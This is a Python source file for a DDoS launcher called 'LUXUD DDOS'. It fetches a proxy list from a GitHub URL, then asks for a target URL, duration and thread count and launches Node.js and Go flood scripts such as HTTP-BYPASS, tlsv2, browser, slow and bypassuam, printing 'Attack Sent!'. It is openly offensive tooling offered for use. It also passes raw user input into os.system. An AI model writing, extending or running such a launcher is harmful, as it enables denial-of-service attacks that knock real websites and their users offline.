import os
import requests
import random
import time
from time import sleep


###IP###
def mip():
    ip = requests.get('https://api.ipify.org').text.strip()
    online = random.randint(1, 153)
    print('Your IP Is: ' + {ip})

def proxy():
    path = os.getcwd()
    filep = os.path.join(path)
    b1 = requests.get('https://raw.githubusercontent.com/duongpokee/adjhasjlfhk/main/asdasfa')
    with open(filep + '\data\proxy.txt','wb') as file2:
            file2.write(b1.content)
            time.sleep(1)
    with open(filep + '\data\proxies.txt','wb') as file2:
            file2.write(b1.content)
            time.sleep(1)
    print("Succesfully !")

def home():
    os.system('cls' if os.name == 'nt' else 'clear')
    print('LUXUD DDOS')
    print('USE METHODS TO DDOS')
    main()

def main():
    while(True):
        cnc = input('Input: ')
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth()
        elif cnc == "PROXY" or cnc == "proxy" or cnc == "Proxy":
            proxy()
        elif cnc == "MYIP" or cnc == "myip" or cnc == "ip":
            mip()
        elif "http-raw" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            os.system(f"node ./data/HTTP-RAW.js {url} {time}")
        elif "http-rand" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-RAND.js {url} {time}")
        elif "http-socket" in cnc:
            url = input("Url: ")
            threads = input("Threads: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-SOCKETS.js {url} {threads} {time}")
        elif "http-mix" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/HTTP-MIX.js {url} {time} ')
        elif "http-bypass" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-BYPASS.js {url} {time}")
        elif "tlsv1" in cnc:
            url = input("Url: ")
            port = input("Port: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/tls.js {url} {port} {time}")
        elif "tlsv2" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            thread = input("Threads: ")
            print('Attack Sent!')
            os.system(f'node ./data/tlsv2.js {url} {time} {thread}')
            print('Attack Sent!')
        elif "browser" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            thread = input("Threads: ")
            print('Attack Sent!')
            os.system(f'node ./data/BROWSER.js {url} {time} {thread} proxy.txt')
            print('Attack Sent!')
        elif "hyper" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/hyper.js {url} {time}")
        elif "slow" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/slow.js {url} {time}")
        elif "bypassuam" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            threads = input("Threads: ")
            os.system(f'node ./data/bypassuam.js GET {url} {time} {threads}')
        elif "ce-mix" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/CE-MIX.js {url} {time} ')
        elif "sever" in cnc:
            url = input("Url: ")
            method = input("Method: ")
            print('Attack Sent!')
            os.system(f'go run ./data/sever.go -site {url} {method}')
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found!!")
            except IndexError:
                pass

def meth():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("►http-raw")
    print("►http-rand")
    print("►http-socket")
    print("►http-mix")
    print("►http-bypass")
    print("►tls")
    print("►tlsv2")
    print("►browser")
    print("►hyper")
    print("►slow")
    print("►bypassuam")
    print("►ce-mix")
    print("►sever")
home()


